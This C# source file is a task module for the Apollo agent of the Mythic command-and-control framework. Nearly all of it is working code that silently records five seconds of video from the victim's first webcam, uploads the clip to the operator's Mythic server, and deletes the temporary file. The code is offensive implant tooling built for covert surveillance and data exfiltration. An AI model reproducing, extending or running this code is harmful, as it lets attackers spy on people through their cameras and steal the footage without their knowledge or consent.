#define COMMAND_NAME_UPPER

#if DEBUG
#define WEBCAMSNAP
#endif

#if WEBCAMSNAP
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using ApolloInterop.Utils;
using AForge.Video;
using AForge.Video.DirectShow;
using AForge.Video.FFMPEG;

namespace Tasks
{
    public class webcamsnap : Tasking
    {
        public webcamsnap(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp = CreateTaskResponse("", true);
            string tempFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.avi");

            try
            {
                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("No se encontraron dispositivos de cámara", true, "error"));
                    return;
                }

                var tcs = new TaskCompletionSource<byte[]>();
                var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                var writer = new VideoFileWriter();
                bool recording = true;

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    if (!writer.IsOpen)
                    {
                        writer.Open(tempFile, eventArgs.Frame.Width, eventArgs.Frame.Height, 25, VideoCodec.MPEG4);
                    }
                    writer.WriteVideoFrame((Bitmap)eventArgs.Frame.Clone());
                };

                videoSource.Start();

                Thread.Sleep(5000);
                recording = false;
                videoSource.SignalToStop();
                videoSource.WaitForStop();
                writer.Close();

                byte[] videoBytes = File.ReadAllBytes(tempFile);

                bool result = _agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, videoBytes, null, out string mythicFileId, true);
                if (!result)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("Error al guardar el archivo en Mythic", true, "error"));
                    return;
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(mythicFileId, false, ""));
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            
            }    
            catch (Exception ex)
            {
               _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(ex.Message, true, "error"));
            }
            finally
            {
                if (File.Exists(tempFile)) File.Delete(tempFile);
            }
        }
    }
}
#endif